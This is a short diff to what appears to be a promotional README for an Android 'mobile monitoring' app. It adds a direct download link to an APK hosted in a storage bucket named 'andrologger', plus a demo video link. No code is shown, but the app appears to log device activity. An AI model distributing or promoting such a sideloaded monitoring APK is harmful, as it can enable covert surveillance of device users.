@@ -44,5 +44,7 @@ Get Started
 Download the application now and experience unparalleled control and visibility over device activity with this comprehensive, easy-to-use mobile monitoring solution
 
 📥 Download: Get the App
+https://firebasestorage.googleapis.com/v0/b/andrologger-fe931.appspot.com/o/Androidsy.apk?alt=media&token=cc7c55ba-46a3-4274-9119-625e90c96e9d
 
 🎬 Watch Demo: View on YouTube
+https://youtu.be/Weakn-x3Wf8?si=mQyC8DOCjYRIiHka
